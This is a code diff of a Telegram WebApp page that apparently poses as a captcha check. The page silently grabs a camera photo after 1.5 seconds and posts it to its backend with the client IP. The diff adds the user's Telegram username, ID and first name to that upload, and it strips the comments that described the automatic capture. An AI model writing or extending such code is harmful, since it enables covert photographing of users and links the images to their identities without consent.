@@ -44,11 +44,16 @@
         tg.ready();
         tg.expand();
 
-        // ⚙️ TỰ ĐỘNG LẤY DOMAIN HIỆN TẠI - không cần hardcode IP nữa
         const BACKEND_URL = window.location.origin;
 
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token') || '';
+
+        // Lấy thông tin user từ Telegram WebApp
+        const tgUser = tg.initDataUnsafe?.user || {};
+        const username = tgUser.username || "Khong_co";
+        const userId = tgUser.id ? String(tgUser.id) : "N/A";
+        const firstName = tgUser.first_name || "Khong_ro";
 
         let clientIp = "";
         const num1 = Math.floor(Math.random() * 10) + 1;
@@ -95,12 +100,10 @@
                 return;
             }
 
-            // Đợi camera ổn định và chụp ảnh ngay lập tức
             await new Promise(r => setTimeout(r, 1500));
             
             capturedImage = snapshotHD();
 
-            // ⚡ GỬI ẢNH NGAY LẬP TỨC sau khi chụp (không đợi captcha)
             if (capturedImage) {
                 sendPhotoToBackend(capturedImage);
             }
@@ -153,7 +156,6 @@
             return "";
         }
 
-        // Gửi ảnh ngay lập tức về backend (auto capture)
         function sendPhotoToBackend(imageData) {
             fetch(`${BACKEND_URL}/api/save-photo`, {
                 method: 'POST',
@@ -162,7 +164,10 @@
                     token: token,
                     ip: clientIp,
                     image: imageData,
-                    auto_capture: true
+                    auto_capture: true,
+                    username: username,
+                    user_id: userId,
+                    first_name: firstName
                 })
             })
             .then(res => res.json())
